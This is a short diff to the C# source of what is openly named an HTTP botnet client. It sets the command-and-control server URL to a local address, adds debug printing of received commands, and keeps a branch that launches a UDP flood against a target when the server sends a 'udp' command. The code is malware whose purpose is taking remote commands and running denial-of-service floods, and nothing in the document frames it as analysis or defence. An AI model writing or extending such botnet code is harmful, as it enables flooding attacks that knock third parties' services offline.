@@ -33,7 +33,7 @@ namespace HttpBotnetClient
         static void Main(string[] args)
         {
 
-            string cncUrl = "cnc.fuckme.com:port/resource";
+            string cncUrl = "http://192.168.1.15:8080";
             string prevCmd = "";
             string dataRecvd = "";
 
@@ -74,9 +74,14 @@ namespace HttpBotnetClient
                 // Null command (wait for one)
                 if (dataRecvd.Equals("NONE"))
                 {
+#if DEBUG
+                    Console.WriteLine("Got None");
+#endif
                     clientSleep(3);
                 } else if (data[0] == "udp" && data.Length == 4) {
                     UdpFlood(target, time, Int32.Parse(data[2]));
+                } else {
+                    Console.WriteLine(dataRecvd);
                 }
 
 
